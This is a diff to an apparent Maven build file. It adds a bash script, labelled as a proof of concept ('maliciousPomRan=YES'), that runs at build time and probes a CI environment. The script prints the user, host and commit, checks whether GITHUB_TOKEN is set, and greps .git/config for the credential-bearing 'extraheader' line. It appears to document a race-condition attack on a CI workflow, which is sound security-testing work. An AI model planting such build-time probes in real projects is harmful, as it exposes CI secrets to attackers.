@@ -32,7 +32,16 @@
                   <executable>/bin/bash</executable>
                   <arguments>
                     <argument>-c</argument>
-                    <argument>echo "=========================== RACE-CONFIRMED-4d5ecf72-e72b-4ed4-817b-db1661cc42bd ==========================="; echo "Running as: $(whoami)@$(hostname)"; echo "Workdir: $(pwd)"; echo "GITHUB_TOKEN present? $([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"; echo "Git config extraheader: $(cat .git/config 2>/dev/null | grep -i extraheader | head -1 | sed 's/AUTHORIZATION:.*/AUTHORIZATION:REDACTED/')"; echo "===================================================================================="</argument>
+                    <argument><![CDATA[
+                      echo "===== RACE-PROVEN-938dfaf3-738b-40b3-8d79-9b4d70c4e90f ====="
+                      echo "PoC-Step: maliciousPomRan=YES"
+                      echo "PoC-User: $(whoami)@$(hostname)"
+                      echo "PoC-Workdir: $(pwd)"
+                      echo "PoC-CurrentSHA: $(git rev-parse HEAD)"
+                      echo "PoC-GitHubToken-Present: $(env | grep -c '^GITHUB_TOKEN=')"
+                      echo "PoC-GitConfigExtraheader: $(cat .git/config | grep -c 'extraheader')"
+                      echo "===== EOM RACE-PROVEN-938dfaf3-738b-40b3-8d79-9b4d70c4e90f ====="
+                    ]]></argument>
                   </arguments>
                 </configuration>
               </execution>
